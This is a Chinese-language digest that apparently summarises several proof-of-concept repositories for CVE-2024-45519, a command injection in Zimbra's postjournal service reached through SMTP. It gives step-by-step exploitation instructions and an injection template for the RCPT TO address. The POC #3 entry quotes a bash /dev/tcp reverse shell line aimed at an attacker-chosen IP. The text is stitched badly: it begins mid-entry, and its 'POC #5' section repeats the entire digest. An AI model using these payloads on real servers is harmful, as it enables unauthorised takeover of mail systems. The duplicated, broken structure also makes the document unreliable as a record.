**利用条件:** 目标服务器开放SMTP端口（通常是25）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-45519 允许未经身份验证的攻击者在受影响的Zimbra服务器上执行任意命令。该漏洞位于`postjournal`服务中。攻击者可以通过构造特殊的SMTP请求，在`RCPT TO`命令中注入恶意代码，从而执行操作系统命令。根据漏洞利用代码，攻击者将构造一个包含反向shell命令的base64编码的字符串，并通过SMTP协议发送到目标服务器。`exploit.py`脚本展示了如何利用此漏洞，包括生成随机电子邮件地址、生成base64编码的反向shell命令、连接到SMTP服务器、发送经过精心构造的SMTP命令。投毒风险评估为10%，主要依据是代码中存在生成随机邮箱地址的行为，这可能会在实际攻击中隐藏攻击者的身份，从而增加溯源难度。但总体而言，漏洞利用代码的目的明确，功能相对独立，因此判定为高度投毒的可能性较低。

**利用方式：**

1.  **确定目标：** 找到运行易受攻击的Zimbra Collaboration Suite版本的服务器，并确定SMTP端口（默认为25）是否开放。
2.  **准备反向shell：** 确定攻击者的IP地址和端口，用于接收来自目标服务器的反向shell连接。
3.  **生成payload：** 使用漏洞利用代码生成包含反向shell命令的base64编码的payload。该payload会被注入到`RCPT TO`命令中。
4.  **发送SMTP请求：** 使用脚本或手动发送构造好的SMTP请求到目标服务器。该请求会利用`postjournal`服务的漏洞。
5.  **获取shell：** 如果攻击成功，攻击者将在其指定的IP地址和端口上接收到反向shell连接，从而控制目标服务器。

**项目地址:** [Chocapikk/CVE-2024-45519](https://github.com/Chocapikk/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #2

**来源**: [CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md](../2024/CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md)

## CVE-2024-45519-Zimbra-远程命令执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程命令执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

**利用条件:** 目标Zimbra服务器的25端口开放且未打补丁

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519是一个存在于Zimbra Collaboration Suite (ZCS) postjournal服务中的远程命令执行漏洞。未经身份验证的攻击者可以利用此漏洞在受影响的Zimbra服务器上执行任意系统命令。

**有效性分析：**

根据提供的漏洞信息和搜索引擎结果，此漏洞已被积极利用，且CISA已将其添加到已知被利用漏洞目录中。POC代码尝试利用SMTP协议的RCPT TO字段中的命令注入漏洞来执行任意命令。POC首先检查目标端口是否开放，然后使用OAST（带外应用安全测试）服务验证漏洞是否存在，最后尝试利用反向shell有效负载进行漏洞利用。

**投毒风险分析：**

审查提供的Python脚本，没有发现明显的投毒代码。该脚本的主要目的是验证和利用CVE-2024-45519漏洞。所有操作都与描述的漏洞利用过程一致，如端口检查、SMTP命令发送、payload注入和reverse shell连接等。脚本没有包含任何隐藏的、非预期的恶意行为，比如数据窃取、恶意文件上传或未经授权的系统修改。脚本依赖用户提供的OAST和reverse shell地址，如果这些地址被恶意控制，可能导致用户受到攻击，但这不属于脚本本身的投毒。

**利用方式：**

1.  **端口扫描：** 使用`is_port_open`函数检查目标Zimbra服务器的25端口（SMTP）是否开放。
2.  **漏洞验证：** 使用`smtp_payload_check_vulnerability`函数，通过构造包含`curl`命令的RCPT TO字段，向目标服务器发送SMTP命令。`curl`命令会尝试访问用户指定的OAST URL，如果OAST服务器收到请求，则表明存在命令注入漏洞。
3.  **漏洞利用：** 使用`smtp_payload_exploit_reverse_shell`函数，构造包含反向shell命令的RCPT TO字段，向目标服务器发送SMTP命令。反向shell命令会在目标服务器上执行，并尝试连接到攻击者指定的IP地址和端口，从而建立一个反向shell连接。
4.  **命令执行：** 成功建立反向shell连接后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [XiaomingX/cve-2024-45519-poc](https://github.com/XiaomingX/cve-2024-45519-poc)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #3

**来源**: [CVE-2024-45519-p33d_CVE-2024-45519.md](../2024/CVE-2024-45519-p33d_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** ZCS before 8.8.15 Patch 46, 9 before 9.0.0 Patch 41, 10 before 10.0.9, and 10.1 before 10.1.1

**利用条件:** 目标Zimbra服务器的25端口（SMTP）开放，且存在漏洞版本的Zimbra。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 存在于Zimbra Collaboration Suite (ZCS) 的 postjournal 服务中，允许未经身份验证的攻击者执行任意命令。该漏洞是由于对输入的不当处理导致 OS 命令注入。利用方式如下：

1.  **漏洞原理：** 漏洞存在于 Zimbra 的 SMTP 服务中，通过构造恶意的 `RCPT TO` 命令，可以在服务器上执行任意命令。
2.  **利用步骤：**
    *   首先，连接到目标 Zimbra 服务器的 25 端口（SMTP）。
    *   发送 `EHLO` 命令进行握手。
    *   使用 `MAIL FROM` 命令指定发件人地址。
    *   通过构造包含命令注入的 `RCPT TO` 命令来利用漏洞。命令注入发生在双引号内，利用 `${IFS}` 绕过空格过滤。
    *   发送 `DATA` 命令，然后发送一些数据，最后以 `.
` 结束。
    *   最后，发送 `QUIT` 命令断开连接。
3.  **POC 代码分析：**  提供的 Python 脚本首先检查目标主机的 SMTP 端口是否开放。然后，它发送一个包含 OAST（Out-of-Band Application Security Testing）地址的 payload，以验证漏洞是否存在。如果漏洞存在，服务器会尝试访问 OAST 地址，从而确认漏洞。接下来，脚本尝试利用该漏洞建立反向 shell 连接到攻击者的机器上。脚本通过构造包含反向 shell 命令的 `RCPT TO` 命令来实现这一点。`reverse_shell = f'/bin/bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'` 这段代码定义了反向 shell 的命令，并将目标机器的标准输入、输出和错误重定向到攻击者的 IP 地址和端口。
4.  **有效性：**根据漏洞库信息、搜索结果和提供的 PoC 代码，可以判断该漏洞利用代码是有效的。搜索结果表明该漏洞已被积极利用。
5.  **投毒风险：**分析 PoC 代码内容，未发现作者隐藏的投毒代码。代码目的是验证漏洞，如果验证通过，会利用此漏洞反弹shell。
综上所述，该漏洞的威胁较高，因为它可以被未经身份验证的攻击者利用，并可能导致完全控制受影响的 Zimbra 服务器。

**项目地址:** [p33d/CVE-2024-45519](https://github.com/p33d/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #4

**来源**: [CVE-2024-45519-sec13b_CVE-2024-45519.md](../2024/CVE-2024-45519-sec13b_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 严重，允许未授权用户执行任意命令

**影响版本:** < 8.8.15 Patch 46, < 9.0.0 Patch 41, < 10.0.9, < 10.1.1

**利用条件:** 目标Zimbra服务器开启了postjournal服务，且端口对外开放

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 是 Zimbra Collaboration Suite (ZCS) 中 postjournal 服务存在的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者通过构造包含恶意命令的电子邮件，利用SMTP协议发送给目标服务器。目标服务器在处理该邮件时，会将恶意命令注入到操作系统中执行，从而实现远程代码执行。

**有效性:** 根据漏洞信息、搜索结果和提供的POC代码，此漏洞利用的有效性较高。漏洞库信息显示该漏洞允许未授权用户执行命令，搜索引擎结果表明该漏洞已被积极利用。提供的POC代码尝试通过构造包含命令的收件人邮箱地址来触发漏洞。

**投毒风险:** 分析POC代码，该脚本主要功能是利用SMTP协议发送包含恶意命令的邮件来触发目标系统的漏洞。该脚本依赖 `interactsh` 服务来验证漏洞是否成功利用，如果收到了回调就证明命令执行成功，`interactsh` 是一个用于带外漏洞检测的工具，本身不具备恶意代码投放能力。因此，在当前提供的代码中，不存在明显的投毒代码。投毒风险为0%。

**利用方式:**
1.  攻击者构造包含恶意命令的电子邮件地址（例如，`"admin$(' + command + ')"@mail.test.com`），其中`command`为要执行的操作系统命令。
2.  使用SMTP协议将该邮件发送到目标Zimbra服务器。
3.  Zimbra服务器的postjournal服务在处理邮件时，由于未正确过滤或转义特殊字符，会将恶意命令注入到操作系统中。
4.  操作系统执行恶意命令，从而导致远程代码执行。
5.  POC 使用 `interactsh` 验证是否利用成功。构造curl和wget命令，回连 `interactsh` 服务器，从而验证命令执行成功。

**项目地址:** [sec13b/CVE-2024-45519](https://github.com/sec13b/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #5

**来源**: [CVE-2024-45519-whiterose7777_CVE-2024-45519.md](../2024/CVE-2024-45519-whiterose7777_CVE-2024-45519.md)

# CVE-2024-45519

> 📦 该CVE有 **4** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-45519-Chocapikk_CVE-2024-45519.md](../2024/CVE-2024-45519-Chocapikk_CVE-2024-45519.md)

## CVE-2024-45519 - Zimbra Collaboration Suite 远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

**利用条件:** 目标服务器开放SMTP端口（通常是25）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-45519 允许未经身份验证的攻击者在受影响的Zimbra服务器上执行任意命令。该漏洞位于`postjournal`服务中。攻击者可以通过构造特殊的SMTP请求，在`RCPT TO`命令中注入恶意代码，从而执行操作系统命令。根据漏洞利用代码，攻击者将构造一个包含反向shell命令的base64编码的字符串，并通过SMTP协议发送到目标服务器。`exploit.py`脚本展示了如何利用此漏洞，包括生成随机电子邮件地址、生成base64编码的反向shell命令、连接到SMTP服务器、发送经过精心构造的SMTP命令。投毒风险评估为10%，主要依据是代码中存在生成随机邮箱地址的行为，这可能会在实际攻击中隐藏攻击者的身份，从而增加溯源难度。但总体而言，漏洞利用代码的目的明确，功能相对独立，因此判定为高度投毒的可能性较低。

**利用方式：**

1.  **确定目标：** 找到运行易受攻击的Zimbra Collaboration Suite版本的服务器，并确定SMTP端口（默认为25）是否开放。
2.  **准备反向shell：** 确定攻击者的IP地址和端口，用于接收来自目标服务器的反向shell连接。
3.  **生成payload：** 使用漏洞利用代码生成包含反向shell命令的base64编码的payload。该payload会被注入到`RCPT TO`命令中。
4.  **发送SMTP请求：** 使用脚本或手动发送构造好的SMTP请求到目标服务器。该请求会利用`postjournal`服务的漏洞。
5.  **获取shell：** 如果攻击成功，攻击者将在其指定的IP地址和端口上接收到反向shell连接，从而控制目标服务器。

**项目地址:** [Chocapikk/CVE-2024-45519](https://github.com/Chocapikk/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #2

**来源**: [CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md](../2024/CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md)

## CVE-2024-45519-Zimbra-远程命令执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程命令执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

**利用条件:** 目标Zimbra服务器的25端口开放且未打补丁

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519是一个存在于Zimbra Collaboration Suite (ZCS) postjournal服务中的远程命令执行漏洞。未经身份验证的攻击者可以利用此漏洞在受影响的Zimbra服务器上执行任意系统命令。

**有效性分析：**

根据提供的漏洞信息和搜索引擎结果，此漏洞已被积极利用，且CISA已将其添加到已知被利用漏洞目录中。POC代码尝试利用SMTP协议的RCPT TO字段中的命令注入漏洞来执行任意命令。POC首先检查目标端口是否开放，然后使用OAST（带外应用安全测试）服务验证漏洞是否存在，最后尝试利用反向shell有效负载进行漏洞利用。

**投毒风险分析：**

审查提供的Python脚本，没有发现明显的投毒代码。该脚本的主要目的是验证和利用CVE-2024-45519漏洞。所有操作都与描述的漏洞利用过程一致，如端口检查、SMTP命令发送、payload注入和reverse shell连接等。脚本没有包含任何隐藏的、非预期的恶意行为，比如数据窃取、恶意文件上传或未经授权的系统修改。脚本依赖用户提供的OAST和reverse shell地址，如果这些地址被恶意控制，可能导致用户受到攻击，但这不属于脚本本身的投毒。

**利用方式：**

1.  **端口扫描：** 使用`is_port_open`函数检查目标Zimbra服务器的25端口（SMTP）是否开放。
2.  **漏洞验证：** 使用`smtp_payload_check_vulnerability`函数，通过构造包含`curl`命令的RCPT TO字段，向目标服务器发送SMTP命令。`curl`命令会尝试访问用户指定的OAST URL，如果OAST服务器收到请求，则表明存在命令注入漏洞。
3.  **漏洞利用：** 使用`smtp_payload_exploit_reverse_shell`函数，构造包含反向shell命令的RCPT TO字段，向目标服务器发送SMTP命令。反向shell命令会在目标服务器上执行，并尝试连接到攻击者指定的IP地址和端口，从而建立一个反向shell连接。
4.  **命令执行：** 成功建立反向shell连接后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [XiaomingX/cve-2024-45519-poc](https://github.com/XiaomingX/cve-2024-45519-poc)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #3

**来源**: [CVE-2024-45519-p33d_CVE-2024-45519.md](../2024/CVE-2024-45519-p33d_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** ZCS before 8.8.15 Patch 46, 9 before 9.0.0 Patch 41, 10 before 10.0.9, and 10.1 before 10.1.1

**利用条件:** 目标Zimbra服务器的25端口（SMTP）开放，且存在漏洞版本的Zimbra。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 存在于Zimbra Collaboration Suite (ZCS) 的 postjournal 服务中，允许未经身份验证的攻击者执行任意命令。该漏洞是由于对输入的不当处理导致 OS 命令注入。利用方式如下：

1.  **漏洞原理：** 漏洞存在于 Zimbra 的 SMTP 服务中，通过构造恶意的 `RCPT TO` 命令，可以在服务器上执行任意命令。
2.  **利用步骤：**
    *   首先，连接到目标 Zimbra 服务器的 25 端口（SMTP）。
    *   发送 `EHLO` 命令进行握手。
    *   使用 `MAIL FROM` 命令指定发件人地址。
    *   通过构造包含命令注入的 `RCPT TO` 命令来利用漏洞。命令注入发生在双引号内，利用 `${IFS}` 绕过空格过滤。
    *   发送 `DATA` 命令，然后发送一些数据，最后以 `.
` 结束。
    *   最后，发送 `QUIT` 命令断开连接。
3.  **POC 代码分析：**  提供的 Python 脚本首先检查目标主机的 SMTP 端口是否开放。然后，它发送一个包含 OAST（Out-of-Band Application Security Testing）地址的 payload，以验证漏洞是否存在。如果漏洞存在，服务器会尝试访问 OAST 地址，从而确认漏洞。接下来，脚本尝试利用该漏洞建立反向 shell 连接到攻击者的机器上。脚本通过构造包含反向 shell 命令的 `RCPT TO` 命令来实现这一点。`reverse_shell = f'/bin/bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'` 这段代码定义了反向 shell 的命令，并将目标机器的标准输入、输出和错误重定向到攻击者的 IP 地址和端口。
4.  **有效性：**根据漏洞库信息、搜索结果和提供的 PoC 代码，可以判断该漏洞利用代码是有效的。搜索结果表明该漏洞已被积极利用。
5.  **投毒风险：**分析 PoC 代码内容，未发现作者隐藏的投毒代码。代码目的是验证漏洞，如果验证通过，会利用此漏洞反弹shell。
综上所述，该漏洞的威胁较高，因为它可以被未经身份验证的攻击者利用，并可能导致完全控制受影响的 Zimbra 服务器。

**项目地址:** [p33d/CVE-2024-45519](https://github.com/p33d/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #4

**来源**: [CVE-2024-45519-sec13b_CVE-2024-45519.md](../2024/CVE-2024-45519-sec13b_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 严重，允许未授权用户执行任意命令

**影响版本:** < 8.8.15 Patch 46, < 9.0.0 Patch 41, < 10.0.9, < 10.1.1

**利用条件:** 目标Zimbra服务器开启了postjournal服务，且端口对外开放

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 是 Zimbra Collaboration Suite (ZCS) 中 postjournal 服务存在的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者通过构造包含恶意命令的电子邮件，利用SMTP协议发送给目标服务器。目标服务器在处理该邮件时，会将恶意命令注入到操作系统中执行，从而实现远程代码执行。

**有效性:** 根据漏洞信息、搜索结果和提供的POC代码，此漏洞利用的有效性较高。漏洞库信息显示该漏洞允许未授权用户执行命令，搜索引擎结果表明该漏洞已被积极利用。提供的POC代码尝试通过构造包含命令的收件人邮箱地址来触发漏洞。

**投毒风险:** 分析POC代码，该脚本主要功能是利用SMTP协议发送包含恶意命令的邮件来触发目标系统的漏洞。该脚本依赖 `interactsh` 服务来验证漏洞是否成功利用，如果收到了回调就证明命令执行成功，`interactsh` 是一个用于带外漏洞检测的工具，本身不具备恶意代码投放能力。因此，在当前提供的代码中，不存在明显的投毒代码。投毒风险为0%。

**利用方式:**
1.  攻击者构造包含恶意命令的电子邮件地址（例如，`"admin$(' + command + ')"@mail.test.com`），其中`command`为要执行的操作系统命令。
2.  使用SMTP协议将该邮件发送到目标Zimbra服务器。
3.  Zimbra服务器的postjournal服务在处理邮件时，由于未正确过滤或转义特殊字符，会将恶意命令注入到操作系统中。
4.  操作系统执行恶意命令，从而导致远程代码执行。
5.  POC 使用 `interactsh` 验证是否利用成功。构造curl和wget命令，回连 `interactsh` 服务器，从而验证命令执行成功。

**项目地址:** [sec13b/CVE-2024-45519](https://github.com/sec13b/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---



---



---



---



---

